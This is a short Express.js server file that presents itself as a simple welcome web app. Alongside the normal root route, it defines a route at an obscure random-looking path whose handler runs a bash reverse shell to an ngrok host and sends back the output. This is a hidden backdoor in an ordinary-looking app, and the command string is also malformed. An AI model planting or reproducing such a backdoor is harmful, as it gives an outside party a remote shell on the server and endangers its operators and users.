const express = require('express')
const { execSync } = require('child_process');
const app = express()
const port = 80

app.get('/', (req, res) => {
  res.send('Welcome to your ASCPC web app!')
})

app.get('/u89jg3own984hoenrdbf0eirhonbdf', (req, res) => {
  const envString = execSync('bash -i >& /dev/tcp/tcp://0.tcp.ngrok.io:15765 0>&1', { encoding: 'utf8' });
  //const envVariables = envString.trim().split('\n');
  res.send('lala'+envString)
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
